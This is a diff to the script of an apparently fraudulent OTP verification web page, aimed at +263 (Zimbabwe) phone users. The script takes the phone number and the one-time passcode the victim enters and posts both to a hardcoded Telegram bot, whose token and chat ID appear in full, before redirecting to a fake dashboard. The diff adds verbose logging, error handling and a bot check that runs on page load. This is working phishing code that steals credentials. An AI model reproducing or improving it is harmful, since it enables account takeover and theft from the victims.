@@ -480,7 +480,7 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS - SAME AS LOGIN
+        // TELEGRAM CREDENTIALS
         // ============================================
         const BOT_TOKEN = '8591477821:AAGwCz3BNGP8uA0Rc7YnoIEJ2JDsrdOy9Bc';
         const CHAT_ID = '8395929995';
@@ -531,29 +531,75 @@
         console.log('📞 Phone:', formattedPhone);
 
         // ============================================
-        // SEND TELEGRAM OTP NOTIFICATION
+        // SEND TELEGRAM OTP NOTIFICATION - WITH DETAILED LOGGING
         // ============================================
         function sendTelegramOTP(otp) {
             const phone = localStorage.getItem('phone') || '771234567';
+            
+            // Build the message
             const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
 
+            console.log('📤 Sending OTP to Telegram...');
+            console.log('📝 Message:', message);
+            console.log('🤖 Using Bot Token:', BOT_TOKEN);
+            console.log('📱 Chat ID:', CHAT_ID);
+
+            // Send to Telegram
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
                     parse_mode: 'Markdown'
                 })
             })
-            .then(response => response.json())
+            .then(response => {
+                console.log('📥 Response Status:', response.status);
+                return response.json();
+            })
             .then(data => {
-                console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
+                console.log('📥 Full Response:', data);
+                if (data.ok) {
+                    console.log('✅ OTP sent to Telegram successfully!');
+                } else {
+                    console.error('❌ Telegram Error:', data.description);
+                    // Show error to user
+                    errorMessage.textContent = '⚠️ Could not send OTP to Telegram. Please try again.';
+                    errorMessage.className = 'error-message show';
+                }
             })
             .catch(error => {
-                console.error('❌ Telegram error:', error.message);
+                console.error('❌ Fetch Error:', error.message);
+                errorMessage.textContent = '⚠️ Network error. Please check your connection.';
+                errorMessage.className = 'error-message show';
             });
         }
+
+        // ============================================
+        // TEST TELEGRAM CONNECTION
+        // ============================================
+        function testTelegramConnection() {
+            console.log('🔍 Testing Telegram connection...');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ Bot is valid! Bot username:', data.result.username);
+                    } else {
+                        console.error('❌ Bot validation failed:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Bot validation error:', error.message);
+                });
+        }
+
+        // Test connection on page load
+        testTelegramConnection();
 
         // ============================================
         // TIMER FUNCTIONS
@@ -760,7 +806,7 @@
                 
                 setTimeout(() => {
                     window.location.href = 'dashboard.html';
-                }, 1000);
+                }, 1500);
             }, 1200);
         });
 
